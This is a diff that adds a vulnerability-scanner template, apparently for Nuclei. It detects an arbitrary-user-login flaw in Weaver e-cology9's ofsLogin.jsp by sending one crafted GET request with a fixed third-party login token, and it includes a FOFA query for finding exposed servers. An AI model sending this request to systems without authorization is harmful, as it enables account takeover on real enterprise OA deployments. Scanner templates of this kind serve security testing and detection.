@@ -1,0 +1,30 @@
+id: ecology-ofslogin-aul
+
+info:
+  name: 泛微 e-cology ofsLogin 任意用户登录
+  author: Chaitin
+  severity: high
+  description: |
+    泛微 e-cology9 ofsLogin.jsp 存在任意用户登录，远程攻击者可组合信息泄露登录任意用户。
+  reference:
+    - https://mp.weixin.qq.com/s/Rhk7DaiL_YgqzaRwahDmjw
+  metadata:
+    max-request: 1
+    fofa-query: app="泛微-协同办公OA"
+  tags: weaver,ecology,auth-bypass
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "location.replace('/wui/index.html');"
+
+      - type: status
+        status:
+          - 200
